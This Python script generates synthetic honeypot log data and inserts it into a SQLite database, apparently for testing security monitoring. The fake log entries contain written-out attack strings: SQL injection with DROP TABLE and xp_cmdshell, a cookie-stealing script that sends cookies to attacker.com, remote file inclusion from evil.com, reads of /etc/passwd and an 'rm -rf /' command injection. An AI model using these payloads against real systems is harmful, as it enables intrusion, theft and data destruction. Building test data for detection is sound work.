import sqlite3
from faker import Faker
import random
from datetime import datetime, timedelta

DATABASE = 'honeypot_logs.db'
NUM_SSH_ENTRIES = 5000   
NUM_WEB_ENTRIES = 10000 

ssh_attack_types = [
    'SSH Brute-force',
    'SSH Dictionary Attack',
    'SSH Credential Stuffing',
    'SSH Password Spraying'
]

web_attack_types = [
    'SQL Injection',
    'Cross-Site Scripting (XSS)',
    'Remote File Inclusion (RFI)',
    'Local File Inclusion (LFI)',
    'Cross-Site Request Forgery (CSRF)',
    'Denial of Service (DoS)',
    'Command Injection',
    'Path Traversal',
    'XML External Entity (XXE)',
    'Directory Listing',
    'Normal'  
]

web_attack_endpoints = {
    'SQL Injection': [
        "/login?user=admin' OR '1'='1",
        "/search?query='; DROP TABLE products; --",
        "/profile?id=1 UNION SELECT username, password FROM users",
        "/admin?cmd=' OR '1'='1",
        "/api/data?filter=<script>alert('XSS')</script>"
    ],
    'Cross-Site Scripting (XSS)': [
        "/search?q=<script>alert('Hacked!')</script>",
        "/comments?post=1&comment=<img src=x onerror=alert(1)>",
        "/profile?bio=javascript:alert('XSS')",
        "/feedback?message='><script>document.location='http://attacker.com/cookie?c='+document.cookie</script>",
        "/update?content=<svg/onload=alert(document.domain)>"
    ],
    'Remote File Inclusion (RFI)': [
        "/page.php?file=http://attacker.com/malware.txt",
        "/include?path=http://evil.com/shell.php"
    ],
    'Local File Inclusion (LFI)': [
        "/page.php?file=../../etc/passwd",
        "/view?file=../../../../../var/www/html/config.php"
    ],
    'Cross-Site Request Forgery (CSRF)': [
        "/transfer?amount=1000&to=attacker",
        "/change_password?new_pass=evilpass&confirm_pass=evilpass"
    ],
    'Denial of Service (DoS)': [
        "/api/data?query=SELECT * FROM users WHERE id=1",
        "/search?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    ],
    'Command Injection': [
        "/execute?cmd=ls -la",
        "/run?script=;rm -rf /"
    ],
    'Path Traversal': [
        "/download?file=../../../../etc/hosts",
        "/access?path=../../../../var/log/syslog"
    ],
    'XML External Entity (XXE)': [
        "/upload?file=<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]> <foo>&xxe;</foo>",
        "/parse?data=<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY test SYSTEM \"file:///etc/hosts\">]><data>&test;</data>"
    ],
    'Directory Listing': [
        "/",
        "/admin/",
        "/uploads/",
        "/files/"
    ],
    'Normal': [ 
        "/home",
        "/about",
        "/contact",
        "/products",
        "/services",
        "/blog",
        "/faq",
        "/terms",
        "/privacy",
        "/login_success"
    ]
}


user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
    'Mozilla/5.0 (Android 11; Mobile; rv:84.0)',
    'curl/7.68.0',
    'PostmanRuntime/7.26.8',
    'python-requests/2.25.1',
    'Wget/1.20.3 (linux-gnu)',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
]

def generate_ssh_attack(fake):
    attempted_passwords = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT 1, 'admin', 'hacked' --",
        "' OR 'a'='a",
        "' OR 1=1 --",
        "' OR EXISTS (SELECT * FROM users WHERE username='admin')",
        "'; EXEC xp_cmdshell('whoami'); --",
        "' AND 1=(SELECT COUNT(*) FROM users) --",
        "' OR SLEEP(5) --",
        "' UNION SELECT null, username, password FROM users --",
        'admin123',
        'rootpassword',
        'letmein',
        'password',
        '123456',
        'qwerty',
        'password123',
        'admin',
        'passw0rd',
        'test123',
        'dragon',
        'shadow',
        'letmein123',
        'hunter2',
        'welcome',
        'trustno1',
        '1234',
        'pass123',
        'superman',
        'batman',
        'iloveyou',
        '123abc',
        'football',
        'secret',
        'access',
        'welcome123',
        'admin1',
        'hello',
        'letmeinplease',
        'password1',
        'trustme',
        'hacker',
        'testtest',
        'monkey',
        'football123',
        'starwars',
        'princess',
        '123password',
        'root123',
        '123qwe',
        'mypass',
        'adminpass',
        'letmein!',
        'changeme',
        'rootroot',
        'mypassword',
        'secure123',
        'unknown',
        'tryme',
        '12345678'
    ]
    return random.choice(attempted_passwords)

def generate_web_attack(fake, attack_type):
    return random.choice(web_attack_endpoints.get(attack_type, ['/home']))

def generate_user_agent():
    return random.choice(user_agents)

def generate_timestamp(fake):
    start_date = datetime.now() - timedelta(days=30)
    return fake.iso8601(tzinfo=None)

def generate_ip(fake):
    return fake.ipv4()

def main():
    fake = Faker()
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()

    ssh_entries = []
    for _ in range(NUM_SSH_ENTRIES):
        timestamp = generate_timestamp(fake)
        src_ip = generate_ip(fake)
        attempted_password = generate_ssh_attack(fake)
        attack_type = random.choice(ssh_attack_types)
        ssh_entries.append((timestamp, src_ip, attempted_password, attack_type))

    cursor.executemany('''
        INSERT INTO ssh_logs (timestamp, src_ip, attempted_password, attack_type)
        VALUES (?, ?, ?, ?)
    ''', ssh_entries)
    print(f"Insérées {NUM_SSH_ENTRIES} entrées dans ssh_logs.")

    web_entries = []
    for _ in range(NUM_WEB_ENTRIES):
        timestamp = generate_timestamp(fake)
        src_ip = generate_ip(fake)
        attack_type = random.choices(
            web_attack_types,
            weights=[10, 10, 5, 5, 5, 5, 5, 3, 3, 3, 50],
            k=1
        )[0]
        attempted_url = generate_web_attack(fake, attack_type)
        user_agent = generate_user_agent()
        web_entries.append((timestamp, src_ip, attempted_url, user_agent, attack_type))

    cursor.executemany('''
        INSERT INTO web_logs (timestamp, src_ip, attempted_url, user_agent, attack_type)
        VALUES (?, ?, ?, ?, ?)
    ''', web_entries)
    print(f"Insérées {NUM_WEB_ENTRIES} entrées dans web_logs.")

    conn.commit()
    conn.close()
    print("Insertion des données terminée.")

if __name__ == "__main__":
    main()

